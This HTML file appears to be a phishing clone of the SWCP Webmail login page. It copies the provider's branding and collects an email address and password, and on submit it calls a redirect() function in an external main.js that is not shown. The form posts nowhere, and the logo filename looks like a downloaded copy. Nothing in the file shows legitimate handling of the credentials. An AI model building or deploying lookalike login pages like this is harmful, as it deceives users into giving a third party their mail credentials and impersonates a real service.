<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <title>SWCP Webmail :: Welcome to SWCP Webmail</title>
    <style>
        @layer utilities {
          .dynamic-zoom {
            transform-origin: top left;
            overflow: hidden;
            width: 100%;
          }
          /* Mobile (0.5x zoom) */
          @media (max-width: 767px) {
            .dynamic-zoom {
              transform: scale(0.5);
              width: 200%;  /* Compensate for scaling */
              height: 200vh;
            }
          }
          /* Tablet (0.75x zoom) */
          @media (min-width: 768px) and (max-width: 1023px) {
            .dynamic-zoom {
              transform: scale(0.75);
              width: 133.33%;  /* 100% / 0.75 */
              height: 133.33vh;
            }
          }
          /* Desktop (1x normal) */
          @media (min-width: 1024px) {
            .dynamic-zoom {
              transform: scale(1);
              width: 100%;
              height: auto;
            }
          }
        }
      </style>
</head>
<body class="bg-[#F6F6F6] dynamic-zoom">
    <div class="px-8">
        <div class="pt-1 relative top-0 left-0">
            <img src="img/swcp_roundcube_logo (1).png" alt="" class="">
        </div>
        <form action="#" class="mt-14 flex flex-col items-center justify-center max-w-sm mx-auto" id="form">
            <div class="bg-[#F2F2F2] border h-36 border-gray-400 w-full ">
                <p class="border-b border-gray-400 bg-gradient-to-b from-gray-50 shadow to-gray-200 font-bold pl-1 text-xs">Welcome to SWCP Webmail</p>
                <div class="flex items-center flex-col px-4 md:px-8">
                    <div class="pt-4 flex gap-2">
                        <label for="" class="text-xs text-gray-500 text-nowrap">Email Address</label>
                        <input type="text" id="email" required class="pl-1 w-full font-normal text-sm border focus:outline-black border-gray-400 h-5 bg-white md:w-60">
                    </div>

                    <div class="pt-1 flex">
                        <label for="password" class="text-xs text-start text-gray-500">Password</label>
                        <input type="password" id="password" required class="w-full pl-1 font-normal text-sm focus:outline-black border border-gray-400 h-5 md:w-60 bg-white ml-8">
                    </div>
                </div>
                <div class="flex justify-center">
                    <button type="submit" onclick="redirect()" class="px-5 py-0.5 shadow-inner border-gray-400 text-black font-bold mt-4 border text-xs">Login</button>
                </div>
            </div>

            <p class="text-xs text-center mt-12 text-gray-400">SWCP Webmail‚óè <a href="https://www.swcp.com/contact-us/" class="text-black"> Get support</a></p>
        </form>
    </div>
    <script src="main.js"></script>
</body>
</html>
